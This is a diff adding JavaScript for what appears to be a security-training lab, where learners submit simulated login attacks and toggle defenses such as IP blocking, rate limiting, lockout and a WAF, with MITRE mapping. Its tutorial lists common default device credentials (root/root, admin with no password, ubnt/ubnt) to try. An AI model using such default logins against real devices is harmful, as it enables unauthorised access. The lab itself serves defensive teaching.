+            { step: 2, objective: "Enter root / root", hint: "Linux superuser", expected_user: "root", expected_pass: "root" },
+            { step: 3, objective: "Enter admin / (empty)", hint: "Some have no password!", expected_user: "admin", expected_pass: "" },
+            { step: 4, objective: "Enter ubnt / ubnt", hint: "Ubiquiti default", expected_user: "ubnt", expected_pass: "ubnt" },
+            { step: 5, objective: "🎉 Complete! Try Sandbox", final: true }
+        ];
+    }
+    
+    function initPayloads() {
+        const c = document.getElementById('payload-buttons');
+        const p = quickPayloads[attackType] || quickPayloads.brute_force;
+        c.innerHTML = p.map(x => `
+            <button onclick="usePayload('${esc(x.user)}','${esc(x.pass)}')" 
+                class="payload-btn px-2 py-1 bg-gray-700 hover:bg-gray-600 rounded text-[10px] font-mono truncate"
+                ${x.golden ? 'data-golden="true"' : ''}>${escH(x.label)}</button>
+        `).join('');
+    }
+
+    // ============================================================================
+    // IP SELECTOR - Load available IPs from backend
+    // ============================================================================
+    async function loadAttackSources() {
+        try {
+            const res = await fetch('/api/lab/sources');
+            attackSources = await res.json();
+            
+            const select = document.getElementById('attacker-ip-select');
+            select.innerHTML = '<option value="">-- Select Attacker IP --</option>';
+            
+            attackSources.forEach(source => {
+                const opt = document.createElement('option');
+                opt.value = source.ip;
+                let label = `${source.emoji} ${source.ip} (${source.country})`;
+                if (source.note) label += ` - ${source.note}`;
+                opt.textContent = label;
+                select.appendChild(opt);
+            });
+            
+            // Auto-select first IP and check its reputation
+            if (attackSources.length > 0) {
+                select.value = attackSources[0].ip;
+                selectedAttackerIp = attackSources[0].ip;
+                checkSelectedIp();
+            }
+        } catch (err) {
+            console.error('Failed to load attack sources:', err);
+            document.getElementById('attacker-ip-select').innerHTML = '<option value="">Enter custom IP →</option>';
+        }
+    }
+
+    // ============================================================================
+    // IP SELECTOR - Selection handlers
+    // ============================================================================
+    function onIpSelected() {
+        const select = document.getElementById('attacker-ip-select');
+        selectedAttackerIp = select.value;
+        document.getElementById('custom-ip-input').value = '';
+        
+        if (selectedAttackerIp) {
+            checkSelectedIp();
+        } else {
+            document.getElementById('ip-reputation-preview').classList.add('hidden');
+        }
+        syncBlockedOverlay();
+        updateDefenseUI();
+    }
+
+    function useCustomIp() {
+        const input = document.getElementById('custom-ip-input');
+        const ip = input.value.trim();
+        if (ip) {
+            selectedAttackerIp = ip;
+            document.getElementById('attacker-ip-select').value = '';
+            checkSelectedIp();
+        }
+        syncBlockedOverlay();
+        updateDefenseUI();
+    }
+
+    // Sync the blocked overlay with the currently selected IP
+    function syncBlockedOverlay() {
+        const ip = selectedAttackerIp || document.getElementById('custom-ip-input').value.trim();
+        if (ip && defenses.blocked_ips.has(ip)) {
+            showBlockedOverlay('🚫', '403 FORBIDDEN', `IP ${ip} is on the firewall blocklist.`, 'M1035 - Limit Access to Resource');
+        } else {
+            hideBlockedOverlay();
+        }
+    }
+
+    // ============================================================================
+    // IP SELECTOR - Check reputation via AbuseIPDB (with caching)
+    // ============================================================================
+    async function checkSelectedIp() {
+        const ip = selectedAttackerIp || document.getElementById('custom-ip-input').value.trim();
+        if (!ip) return;
+        
+        const preview = document.getElementById('ip-reputation-preview');
+        const scoreEl = document.getElementById('preview-score');
+        const countryEl = document.getElementById('preview-country');
+        const sourceEl = document.getElementById('preview-source');
+        
+        scoreEl.textContent = '⏳';
+        scoreEl.className = 'font-bold ml-1 text-gray-400';
+        preview.classList.remove('hidden');
+        
+        try {
+            const res = await fetch('/api/lab/check_ip', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip: ip })
+            });
+            const data = await res.json();
+            
+            // Color-code the score
+            const score = data.score;
+            let scoreColor = 'text-green-400';
+            if (score >= 75) scoreColor = 'text-red-500';
+            else if (score >= 50) scoreColor = 'text-orange-400';
+            else if (score >= 25) scoreColor = 'text-yellow-400';
+            
+            scoreEl.className = `font-bold ml-1 ${scoreColor}`;
+            scoreEl.textContent = `${score}%`;
+            countryEl.textContent = data.country || 'Unknown';
+            sourceEl.textContent = data.cached ? '📦 Cache' : `🌐 ${data.source}`;
+            
+        } catch (err) {
+            scoreEl.textContent = 'Error';
+            scoreEl.className = 'font-bold ml-1 text-red-400';
+            console.error('IP check failed:', err);
+        }
+    }
+
+    // ============================================================================
+    // SIDEBAR
+    // ============================================================================
+    function toggleSidebar() {
+        const s = document.querySelector('body > aside');
+        sidebarVisible = !sidebarVisible;
+        s.classList.toggle('sidebar-visible', sidebarVisible);
+    }
+
+    // ============================================================================
+    // EDUCATION PANEL
+    // ============================================================================
+    function toggleEducation() {
+        const p = document.getElementById('education-panel');
+        educationVisible = !educationVisible;
+        p.classList.toggle('collapsed', !educationVisible);
+        p.classList.toggle('expanded', educationVisible);
+        document.getElementById('edu-toggle-text').textContent = educationVisible ? 'Hide Info' : 'Show Info';
+    }
+
+    // ============================================================================
+    // OBJECTIVE DETAIL POPUP
+    // ============================================================================
+    function toggleObjectivePopup() {
+        const popup = document.getElementById('objective-popup');
+        if (tutorialStep === 0) return;
+        popup.classList.toggle('visible');
+    }
+    
+    function closeObjectivePopup() {
+        document.getElementById('objective-popup').classList.remove('visible');
+    }
+    
+    document.addEventListener('click', (e) => {
+        const popup = document.getElementById('objective-popup');
+        const objective = document.getElementById('objective-text');
+        if (popup && !popup.contains(e.target) && e.target !== objective) {
+            popup.classList.remove('visible');
+        }
+    });
+
+    // ============================================================================
+    // MODE
+    // ============================================================================
+    function setMode(m) {
+        mode = m;
+        document.getElementById('btn-guided').className = mode === 'guided' 
+            ? 'px-3 py-1 rounded text-xs font-semibold bg-amber-500 text-black'
+            : 'px-3 py-1 rounded text-xs font-semibold text-gray-400 hover:text-white';
+        document.getElementById('btn-sandbox').className = mode === 'sandbox'
+            ? 'px-3 py-1 rounded text-xs font-semibold bg-amber-500 text-black'
+            : 'px-3 py-1 rounded text-xs font-semibold text-gray-400 hover:text-white';
+        
+        document.getElementById('tutorial-bar').style.display = mode === 'guided' ? 'block' : 'none';
+        document.getElementById('quick-payloads').style.display = mode === 'sandbox' ? 'block' : 'none';
+        document.getElementById('username-hint').style.display = 'none';
+        document.getElementById('btn-reveal').classList.remove('visible');
+        
+        const btn = document.getElementById('btn-tutorial-action');
+        if (mode === 'sandbox') {
+            btn.textContent = '🎮 Free Play';
+            btn.disabled = true;
+            btn.className = 'px-4 py-2 bg-gray-600 text-gray-400 rounded text-xs cursor-not-allowed';
+            document.getElementById('login-container').classList.remove('challenge-active');
+        } else {
+            updateTutorialUI();
+        }
+    }
+
+    // ============================================================================
+    // TUTORIAL
+    // ============================================================================
+    function tutorialAction() {
+        if (tutorialStep === 0) { tutorialStep = 1; updateTutorialUI(); }
+    }
+    
+    function updateTutorialUI() {
+        if (mode !== 'guided' || !tutorialData.length) return;
+        
+        const idx = tutorialStep === 0 ? 0 : tutorialStep - 1;
+        const step = tutorialData[idx] || {};
+        const total = tutorialData.length;
+        const pct = tutorialStep === 0 ? 0 : (tutorialStep / total) * 100;
+        
+        document.getElementById('tutorial-progress').style.width = pct + '%';
+        document.getElementById('tutorial-step').textContent = `${tutorialStep}/${total}`;
+        
+        const objEl = document.getElementById('objective-text');
+        objEl.textContent = step.objective || 'Click "Start Tutorial"';
+        
+        // Highlight objective as clickable when a task is active
+        const isActive = tutorialStep > 0 && !step.final;
+        objEl.classList.toggle('active-task', isActive);
+        objEl.title = isActive ? 'Click to see full task details' : '';
+        
+        // Populate popup
+        document.getElementById('popup-username').textContent = isActive ? (step.expected_user || '(empty)') : '—';
+        document.getElementById('popup-password').textContent = isActive ? (step.expected_pass === '' ? '(empty)' : step.expected_pass || '(empty)') : '—';
+        document.getElementById('popup-hint').textContent = isActive ? (step.hint || '—') : '—';
+        
+        // Close popup on step change
+        closeObjectivePopup();
+        
+        // Hint
+        const hint = document.getElementById('username-hint');
+        if (tutorialStep > 0 && step.hint && !step.final) {
+            hint.innerHTML = `💡 ${step.hint}`;
+            hint.style.display = 'block';
+        } else {
+            hint.style.display = 'none';
+        }
+        
+        // Reveal button after 8 seconds
+        clearTimeout(revealTimer);
+        if (tutorialStep > 0 && !step.final) {
+            document.getElementById('btn-reveal').classList.remove('visible');
+            revealTimer = setTimeout(() => document.getElementById('btn-reveal').classList.add('visible'), 8000);
+        } else {
+            document.getElementById('btn-reveal').classList.remove('visible');
+        }
+        
+        // Action button
+        const btn = document.getElementById('btn-tutorial-action');
+        if (tutorialStep === 0) {
+            btn.textContent = '▶ Start Tutorial';
+            btn.disabled = false;
+            btn.className = 'px-4 py-2 bg-amber-500 hover:bg-amber-400 text-black font-bold rounded text-xs';
+        } else if (step.final) {
+            btn.textContent = '🎉 Try Sandbox';
+            btn.disabled = false;
+            btn.onclick = () => setMode('sandbox');
+            btn.className = 'px-4 py-2 bg-green-500 hover:bg-green-400 text-black font-bold rounded text-xs';
+        } else {
+            btn.textContent = '⏳ Complete Task';
+            btn.disabled = true;
+            btn.className = 'px-4 py-2 bg-gray-600 text-gray-400 rounded text-xs cursor-not-allowed';
+        }
+        
+        document.getElementById('login-container').classList.toggle('challenge-active', tutorialStep > 0 && !step.final);
+    }
+    
+    function revealAnswer() {
+        if (!tutorialData.length || tutorialStep === 0) return;
+        const step = tutorialData[tutorialStep - 1];
+        if (!step || step.final) return;
+        
+        document.getElementById('input-username').value = step.expected_user || '';
+        document.getElementById('input-password').value = step.expected_pass || '';
+        document.getElementById('input-username').style.background = '#fef3c7';
+        document.getElementById('input-password').style.background = '#fef3c7';
+        setTimeout(() => {
+            document.getElementById('input-username').style.background = '';
+            document.getElementById('input-password').style.background = '';
+        }, 1500);
+        document.getElementById('btn-reveal').classList.remove('visible');
+    }
+    
+    function checkProgress(u, p) {
+        if (mode !== 'guided' || tutorialStep === 0 || !tutorialData.length) return;
+        const step = tutorialData[tutorialStep - 1];
+        if (!step || step.final) return;
+        
+        if (u.toLowerCase().trim() === (step.expected_user || '').toLowerCase() &&
+            p.toLowerCase().trim() === (step.expected_pass || '').toLowerCase()) {
+            tutorialStep++;
+            updateTutorialUI();
+            document.getElementById('login-container').classList.add('success-flash');
+            setTimeout(() => document.getElementById('login-container').classList.remove('success-flash'), 1000);
+        }
+    }
+
+    // ============================================================================
+    // ACTIVE DEFENSE CONTROLS
+    // ============================================================================
+    async function toggleBlockIp() {
+        const ip = selectedAttackerIp || document.getElementById('custom-ip-input').value.trim();
+        if (!ip) { logDefense('⚠️ Select an attacker IP first', 'text-yellow-400'); return; }
+        
+        const isBlocked = defenses.blocked_ips.has(ip);
+        const action = isBlocked ? 'unblock_ip' : 'block_ip';
+        
+        try {
+            const res = await fetch('/api/lab/defend', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action, ip })
+            });
+            const data = await res.json();
+            logDefense(`[DEF] ${data.message}`, 'text-cyan-400');
+            if (data.mitre) logDefense(`[MITRE] ${data.mitre}`, 'text-purple-400');
+            
+            // Update local Set from server response
+            if (data.defenses && data.defenses.blocked_ips) {
+                defenses.blocked_ips = new Set(data.defenses.blocked_ips);
+            } else {
+                // Fallback: toggle locally
+                if (isBlocked) defenses.blocked_ips.delete(ip);
+                else defenses.blocked_ips.add(ip);
+            }
+            
+            updateDefenseUI();
+            syncBlockedOverlay();
+        } catch (err) {
+            console.error('Defense error:', err);
+        }
+    }
+    
+    async function toggleRateLimit() {
+        defenses.rate_limit = !defenses.rate_limit;
+        const action = defenses.rate_limit ? 'enable_rate_limit' : 'disable_rate_limit';
+        
+        try {
+            const res = await fetch('/api/lab/defend', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action, max_requests: 5 })
+            });
+            const data = await res.json();
+            logDefense(`[DEF] ${data.message}`, 'text-cyan-400');
+            if (data.mitre) logDefense(`[MITRE] ${data.mitre}`, 'text-purple-400');
+            updateDefenseUI();
+            if (!defenses.rate_limit) hideBlockedOverlay();
+        } catch (err) {
+            console.error('Defense error:', err);
+        }
+    }
+    
+    async function toggleLockout() {
+        defenses.account_lockout = !defenses.account_lockout;
+        const action = defenses.account_lockout ? 'enable_lockout' : 'disable_lockout';
+        
+        try {
+            const res = await fetch('/api/lab/defend', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action, threshold: 3 })
+            });
+            const data = await res.json();
+            logDefense(`[DEF] ${data.message}`, 'text-cyan-400');
+            if (data.mitre) logDefense(`[MITRE] ${data.mitre}`, 'text-purple-400');
+            updateDefenseUI();
+            if (!defenses.account_lockout) hideBlockedOverlay();
+        } catch (err) {
+            console.error('Defense error:', err);
+        }
+    }
+    
+    async function toggleWaf() {
+        defenses.waf = !defenses.waf;
+        const action = defenses.waf ? 'enable_waf' : 'disable_waf';
+        
+        try {
+            const res = await fetch('/api/lab/defend', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action })
+            });
+            const data = await res.json();
+            logDefense(`[DEF] ${data.message}`, 'text-cyan-400');
+            if (data.mitre) logDefense(`[MITRE] ${data.mitre}`, 'text-purple-400');
+            updateDefenseUI();
+            if (!defenses.waf) hideBlockedOverlay();
+        } catch (err) {
+            console.error('Defense error:', err);
+        }
+    }
+    
+    async function resetDefenses() {
+        defenses.blocked_ips.clear();
+        defenses.rate_limit = false;
+        defenses.account_lockout = false;
+        defenses.waf = false;
+        defenses.blocked_count = 0;
+        
+        try {
+            await fetch('/api/lab/defend', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'reset_all' })
+            });
+            logDefense('[DEF] All defenses reset', 'text-cyan-400');
+            updateDefenseUI();
+            hideBlockedOverlay();
+        } catch (err) {
+            console.error('Defense reset error:', err);
+        }
+    }
+    
+    function updateDefenseUI() {
+        const blockBtn = document.getElementById('def-block-ip');
+        const rateBtn = document.getElementById('def-rate-limit');
+        const lockBtn = document.getElementById('def-lockout');
+        const wafBtn = document.getElementById('def-waf');
+        
+        // Check if CURRENT selected IP is blocked
+        const currentIp = selectedAttackerIp || document.getElementById('custom-ip-input').value.trim();
+        const currentIpBlocked = currentIp && defenses.blocked_ips.has(currentIp);
+        const anyIpBlocked = defenses.blocked_ips.size > 0;
+        
+        // Save tooltip HTML before modifying
+        const blockTooltip = blockBtn.querySelector('.tooltip')?.outerHTML || '';
+        
+        // Update Block IP button — reflects current IP's status
+        blockBtn.className = currentIpBlocked
+            ? 'defense-btn active flex-1 px-2 py-1.5 bg-red-900/60 border-2 border-red-500 rounded text-[10px] font-semibold text-red-300 text-center'
+            : 'defense-btn flex-1 px-2 py-1.5 bg-gray-700 hover:bg-red-900/50 border border-gray-600 rounded text-[10px] font-semibold text-gray-300 text-center';
+        blockBtn.innerHTML = (currentIpBlocked ? '✅ Unblock IP' : '🚫 Block IP') + blockTooltip;
+        
+        // Update Rate Limit button
+        rateBtn.className = defenses.rate_limit
+            ? 'defense-btn active flex-1 px-2 py-1.5 bg-orange-900/60 border-2 border-orange-500 rounded text-[10px] font-semibold text-orange-300 text-center'
+            : 'defense-btn flex-1 px-2 py-1.5 bg-gray-700 hover:bg-orange-900/50 border border-gray-600 rounded text-[10px] font-semibold text-gray-300 text-center';
+        
+        // Update Lockout button
+        lockBtn.className = defenses.account_lockout
+            ? 'defense-btn active flex-1 px-2 py-1.5 bg-yellow-900/60 border-2 border-yellow-500 rounded text-[10px] font-semibold text-yellow-300 text-center'
+            : 'defense-btn flex-1 px-2 py-1.5 bg-gray-700 hover:bg-yellow-900/50 border border-gray-600 rounded text-[10px] font-semibold text-gray-300 text-center';
+        
+        // Update WAF button
+        wafBtn.className = defenses.waf
+            ? 'defense-btn active flex-1 px-2 py-1.5 bg-green-900/60 border-2 border-green-500 rounded text-[10px] font-semibold text-green-300 text-center'
+            : 'defense-btn flex-1 px-2 py-1.5 bg-gray-700 hover:bg-green-900/50 border border-gray-600 rounded text-[10px] font-semibold text-gray-300 text-center';
+        
+        // Active defenses indicator
+        const bar = document.getElementById('active-defenses-bar');
+        const tags = [];
+        if (anyIpBlocked) {
+            const count = defenses.blocked_ips.size;
+            const ips = [...defenses.blocked_ips].join(', ');
+            tags.push(`<span class="px-1.5 py-0.5 bg-red-900/50 text-red-400 text-[9px] font-bold rounded" title="${ips}">🚫 ${count} IP${count > 1 ? 's' : ''} Blocked</span>`);
+        }
+        if (defenses.rate_limit) tags.push('<span class="px-1.5 py-0.5 bg-orange-900/50 text-orange-400 text-[9px] font-bold rounded">⏱️ Rate Limited</span>');
+        if (defenses.account_lockout) tags.push('<span class="px-1.5 py-0.5 bg-yellow-900/50 text-yellow-400 text-[9px] font-bold rounded">🔒 Lockout Active</span>');
+        if (defenses.waf) tags.push('<span class="px-1.5 py-0.5 bg-green-900/50 text-green-400 text-[9px] font-bold rounded">🛡️ WAF Active</span>');
+        
+        if (tags.length > 0) {
+            bar.innerHTML = tags.join('');
+            bar.classList.remove('hidden');
+        } else {
+            bar.classList.add('hidden');
+        }
+    }
+    
+    // Blocked overlay on attacker side
+    function showBlockedOverlay(icon, title, detail, mitre) {
+        const overlay = document.getElementById('blocked-overlay');
+        document.getElementById('blocked-icon').textContent = icon;
+        document.getElementById('blocked-title').textContent = title;
+        document.getElementById('blocked-detail').textContent = detail;
+        document.getElementById('blocked-mitre').textContent = mitre;
+        overlay.style.display = 'flex';
+    }
+    
+    function hideBlockedOverlay() {
+        document.getElementById('blocked-overlay').style.display = 'none';
+    }
+    
+    function logDefense(msg, color) {
+        const c = document.getElementById('log-container');
+        const d = document.createElement('div');
+        d.className = `log-entry ${color || 'text-cyan-400'}`;
+        d.textContent = msg;
+        c.appendChild(d);
+        d.scrollIntoView({ behavior: "smooth", block: "end" });
+    }
+
+    // ============================================================================
+    // ATTACK SUBMISSION - Checks defense responses
+    // ============================================================================
+    async function submitAttack(e) {
+        e.preventDefault();
+        const u = document.getElementById('input-username').value;
+        const p = document.getElementById('input-password').value;
+        
+        if (!u && !p) { showError('Enter credentials'); return; }
+        
+        const attackerIp = selectedAttackerIp || document.getElementById('custom-ip-input').value.trim();
+        
+        try {
+            const res = await fetch('/api/lab/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    username: u, 
+                    password: p, 
+                    attack_type: attackType,
+                    attacker_ip: attackerIp
+                })
+            });
+            const data = await res.json();
+            
+            if (data.status === 'blocked') {
+                // ===== DEFENSE TRIGGERED =====
+                handleBlocked(data);
+                if (isMissionMode) {
+                    missionBlocked++;
+                    sessionStorage.setItem('mission_blocked', missionBlocked.toString());
+                }
+            } else if (data.status === 'captured') {
+                // ===== NORMAL CAPTURE =====
+                if (isMissionMode) {
+                    missionAttempts++;
+                    sessionStorage.setItem('mission_attempts', missionAttempts.toString());
+                }
+                
+                // Check golden payload match (mission mode success)
+                if (isMissionMode && data.golden_match) {
+                    hideBlockedOverlay();
+                    triggerMissionSuccess();
+                    return;
+                }
+                
+                hideBlockedOverlay();
+                showError('Invalid username or password');
+                logAttack(data);
+                updateMITRE(data);
+                updateStats(data.classification);
+                updateEdu(data.classification);
+                
+                // Mission mode: progressive hints after failed attempts
+                if (isMissionMode) {
+                    checkMissionHints();
+                }
+                
+                // Check if account just got locked
+                if (data.defenses_active?.lockout_warning) {
+                    setTimeout(() => {
+                        logDefense(`[DEF] 🔒 Account "${u}" LOCKED after ${3} failed attempts`, 'text-yellow-400');
+                        logDefense('[MITRE] M1032 - Multi-factor Authentication', 'text-purple-400');
+                    }, 500);
+                }
+                
+                if (data.ip_reputation) {
+                    const score = data.ip_reputation.score;
+                    let scoreColor = 'text-green-400';
+                    if (score >= 75) scoreColor = 'text-red-500';
+                    else if (score >= 50) scoreColor = 'text-orange-400';
+                    else if (score >= 25) scoreColor = 'text-yellow-400';
+                    
+                    document.getElementById('preview-score').className = `font-bold ml-1 ${scoreColor}`;
+                    document.getElementById('preview-score').textContent = `${score}%`;
+                    document.getElementById('preview-source').textContent = 
+                        data.ip_reputation.cached ? '📦 Cache' : `🌐 ${data.ip_reputation.source}`;
+                }
+            }
+        } catch (err) {
+            logLocal(u, p);
+        }
+        
+        checkProgress(u, p);
+        document.getElementById('input-username').value = '';
+        document.getElementById('input-password').value = '';
+    }
+    
+    function handleBlocked(data) {
+        const t = new Date().toLocaleTimeString();
+        const c = document.getElementById('log-container');
+        const src = data.source || {};
+        
+        // Show blocked feedback on attacker side
+        if (data.defense === 'ip_block') {
+            showBlockedOverlay('🚫', '403 FORBIDDEN', data.detail, data.mitre);
+            showError('Connection refused');
+        } else if (data.defense === 'rate_limit') {
+            showBlockedOverlay('⏱️', '429 TOO MANY REQUESTS', data.detail, data.mitre);
+            showError('Too many requests - try again later');
+            setTimeout(hideBlockedOverlay, 3000);
+        } else if (data.defense === 'account_lockout') {
+            showBlockedOverlay('🔒', 'ACCOUNT LOCKED', data.detail, data.mitre);
+            showError('Account locked. Contact administrator.');
+            setTimeout(hideBlockedOverlay, 3000);
+        } else if (data.defense === 'waf') {
+            showBlockedOverlay('🛡️', '403 FORBIDDEN', 'Malicious payload detected by WAF signature filter.', data.mitre);
+            showError('Request blocked - malicious payload detected');
+            setTimeout(hideBlockedOverlay, 3000);
+        }
+        
+        defenses.blocked_count++;
+        
+        // Log in defender terminal
+        const logs = [
+            { t: `[${t}] ─────────────────────`, c: 'text-gray-600' },
+            { t: `[CAP] POST /login from ${src.ip || '?'} ${src.emoji || '🌐'}`, c: 'text-yellow-400' },
+            { t: `[🛡️ BLOCKED] ${data.message}`, c: 'text-cyan-400 log-highlight' },
+        ];
+        
+        // Add WAF signature detail line
+        if (data.defense === 'waf' && data.detail) {
+            logs.push({ t: `[WAF] ${data.detail}`, c: 'text-green-400' });
+        }
+        
+        logs.push({ t: `[MITRE] ${data.mitre}`, c: 'text-purple-400' });
+        
+        logs.forEach((l, i) => {
+            setTimeout(() => {
+                const d = document.createElement('div');
+                d.className = `log-entry ${l.c}`;
+                d.textContent = l.t;
+                c.appendChild(d);
+                d.scrollIntoView({ behavior: "smooth", block: "end" });
+            }, i * 60);
+        });
+    }
+    
+    function showError(msg) {
+        document.getElementById('error-message').textContent = msg;
+        document.getElementById('login-error').classList.remove('hidden');
+        setTimeout(() => document.getElementById('login-error').classList.add('hidden'), 2500);
+    }
+
+    // ============================================================================
+    // LOGGING - Updated to show real abuse score from AbuseIPDB
+    // ============================================================================
+    function logAttack(data) {
+        const t = new Date().toLocaleTimeString();
+        const c = document.getElementById('log-container');
+        const cls = data.classification;
+        const src = data.source;
+        const rep = data.ip_reputation || { score: 0, source: 'N/A' };
+        const tc = cls.threat_level === 'HIGH' ? 'text-red-400' : cls.threat_level === 'MEDIUM' ? 'text-orange-400' : 'text-yellow-400';
+        
+        // Color for abuse score
+        let scoreColor = 'text-green-400';
+        if (rep.score >= 75) scoreColor = 'text-red-400';
+        else if (rep.score >= 50) scoreColor = 'text-orange-400';
+        else if (rep.score >= 25) scoreColor = 'text-yellow-400';
+        
+        const logs = [
+            { t: `[${t}] ─────────────────────`, c: 'text-gray-600' },
+            { t: `[CAP] POST /login from ${src.ip} ${src.emoji || '🌐'}`, c: 'text-yellow-400' },
+            { t: `[CAP] ${cls.payload_analysis}`, c: 'text-white' },
+            { t: `[DET] ${cls.attack_type}`, c: cls.threat_level === 'HIGH' ? 'text-red-400 log-alert' : 'text-orange-400' },
+            { t: `[MITRE] ${cls.mitre_id} - ${cls.technique}`, c: 'text-purple-400' },
+            { t: `[ABUSE] Score: ${rep.score}% (${rep.source})`, c: scoreColor },
+            { t: `[DB] #${data.attack_id} logged ✓`, c: 'text-green-400 log-highlight' },
+        ];
+        
+        logs.forEach((l, i) => {
+            setTimeout(() => {
+                const d = document.createElement('div');
+                d.className = `log-entry ${l.c}`;
+                d.textContent = l.t;
+                c.appendChild(d);
+                d.scrollIntoView({ behavior: "smooth", block: "end" });
+            }, i * 60);
+        });
+    }
+    
+    function logLocal(u, p) {
+        const c = document.getElementById('log-container');
+        const d = document.createElement('div');
+        d.className = 'log-entry text-yellow-400';
+        d.textContent = `[${new Date().toLocaleTimeString()}] LOCAL: ${u}/${p||'(empty)'}`;
+        c.appendChild(d);
+        d.scrollIntoView({ behavior: "smooth", block: "end" });
+        stats.total++;
+        updateStatsUI();
+    }
+    
+    function updateStats(cls) {
+        stats.total++;
+        if (cls.attack_type.includes('Brute')) stats.brute_force++;
+        else if (cls.attack_type.includes('SQL')) stats.sqli++;
+        else if (cls.attack_type.includes('Command')) stats.cmdi++;
+        updateStatsUI();
+    }
+    
+    function updateStatsUI() {
+        document.getElementById('stat-total').textContent = stats.total;
+        document.getElementById('stat-bruteforce').textContent = stats.brute_force;
+        document.getElementById('stat-sqli').textContent = stats.sqli;
+        document.getElementById('stat-cmdi').textContent = stats.cmdi;
+        
+        let lvl = 'LOW', cls = 'text-green-400';
+        if (stats.sqli > 0 || stats.cmdi > 0) { lvl = 'HIGH'; cls = 'text-red-400'; }
+        else if (stats.total > 5) { lvl = 'MEDIUM'; cls = 'text-orange-400'; }
+        document.getElementById('stat-threat').textContent = lvl;
+        document.getElementById('stat-threat').className = `text-base font-bold ${cls}`;
+    }
+    
+    function updateMITRE(data) {
+        const cls = data.classification;
+        const icon = cls.attack_type.includes('SQL') ? '💉' : cls.attack_type.includes('Command') ? '⚡' : '🔑';
+        document.getElementById('mitre-content').innerHTML = `
+            <div class="flex items-center gap-2">
+                <span>${icon}</span>
+                <div>
+                    <div class="font-bold text-${cls.threat_level === 'HIGH' ? 'red' : 'orange'}-400 text-xs">${cls.mitre_id} - ${cls.technique}</div>
+                    <div class="text-[10px] text-gray-400">${cls.tactic}</div>
+                </div>
+            </div>
+        `;
+    }
+    
+    function updateEdu(cls) {
+        document.getElementById('explanation-text').textContent = cls.explanation;
+        if (cls.defense_tips?.length) document.getElementById('defense-tip').textContent = cls.defense_tips[0];
+    }
+
+    // ============================================================================
+    // UTILS
+    // ============================================================================
+    function usePayload(u, p) {
+        document.getElementById('input-username').value = u;
+        document.getElementById('input-password').value = p;
+    }
+    function clearLogs() {
+        document.getElementById('log-container').innerHTML = '<div class="text-green-400">[READY] Cleared.</div>';
+    }
+    function resetLab() { 
+        // Reset defenses on server before reloading
+        fetch('/api/lab/defend', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'reset_all' })
+        }).finally(() => location.reload());
+    }
+    // ===== MISSION MODE PROGRESSIVE HINTS =====
+    function checkMissionHints() {
+        const qp = document.getElementById('quick-payloads');
+        if (!qp || qp.style.display === 'none') return;
+        
+        // Stage 1: After 3 failed attempts — pulse the whole quick payloads area
+        if (missionAttempts >= 3 && !qp.classList.contains('hint-nudge')) {
+            qp.classList.add('hint-nudge');
+        }
+        
+        // Stage 2: After 5 failed attempts — highlight the golden payload button
+        if (missionAttempts >= 5) {
+            const goldenBtn = qp.querySelector('.payload-btn[data-golden]');
+            if (goldenBtn && !goldenBtn.classList.contains('hint-golden')) {
+                goldenBtn.classList.add('hint-golden');
+            }
+        }
+    }
+
+    // ===== MISSION MODE SUCCESS =====
+    function triggerMissionSuccess() {
+        // Flash the login form green, then redirect
+        const form = document.getElementById('fake-login');
+        if (form) {
+            form.style.transition = 'all 0.3s ease';
+            form.style.border = '3px solid #22c55e';
+            form.style.boxShadow = '0 0 30px rgba(34, 197, 94, 0.4)';
+        }
+        
+        // Show "Access Granted" in error area
+        const errEl = document.getElementById('error-message');
+        if (errEl) {
+            errEl.textContent = '✅ ACCESS GRANTED';
+            errEl.style.color = '#22c55e';
+            errEl.style.fontSize = '14px';
+            errEl.style.fontWeight = 'bold';
+        }
+        
+        // Log in defender terminal
+        const c = document.getElementById('log-container');
+        const t = new Date().toLocaleTimeString();
+        const logs = [
+            { t: `[${t}] ─────────────────────`, c: 'text-gray-600' },
+            { t: '[‼️ BREACH] ATTACKER AUTHENTICATED SUCCESSFULLY', c: 'text-red-500 font-bold' },
+            { t: '[CRITICAL] Unauthorized access to admin panel', c: 'text-red-400' },
+            { t: '[MITRE] T1078 - Valid Accounts', c: 'text-purple-400' },
+        ];
+        logs.forEach((l, i) => {
+            setTimeout(() => {
+                const d = document.createElement('div');
+                d.className = `log-entry ${l.c}`;
+                d.textContent = l.t;
+                c.appendChild(d);
+                d.scrollIntoView({ behavior: "smooth", block: "end" });
+            }, i * 100);
+        });
+        
+        // Redirect to success page after brief pause
+        setTimeout(() => {
+            window.location.href = '/lab/mission/success';
+        }, 2000);
+    }
+
+    function escH(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
+    function esc(t) { return t.replace(/'/g, "\\'"); }
+</script>
+{% endblock %}
